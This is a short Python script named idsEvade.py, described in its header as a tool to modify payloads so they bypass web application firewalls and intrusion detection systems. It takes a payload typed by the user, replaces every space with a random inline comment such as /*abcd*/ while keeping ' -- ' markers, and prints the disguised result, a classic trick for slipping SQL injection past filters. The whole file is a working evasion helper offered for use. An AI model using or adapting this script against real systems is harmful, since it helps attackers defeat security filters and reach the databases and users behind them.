#CodeName: idsEvade.py
#Author: Dahir Muhammad Dahir
#Date: 10th-May-2018
#About: script to modified input payload to bypass WAFs and IDS

import random
import re

letters = "abcdefghijklmnopqrstuvwxyz"
controlPattern = r"\s--\s"
pattern = r"\s"

def main():
	while(True):
		inputPayload = raw_input("\n\ngive me the payload:\n")
		if inputPayload == "exit":
			exit()
		controlledPayload = re.sub(controlPattern, "ayilaR", inputPayload)
		cleanPayload = re.sub(pattern, "/*%s*/"%("".join(random.sample(letters, 4))), controlledPayload)
		finalPayload = re.sub("ayilaR", " -- ", cleanPayload)
		print("Here you go:\n\n\n%s"%(finalPayload))



if __name__ == '__main__':
	main()
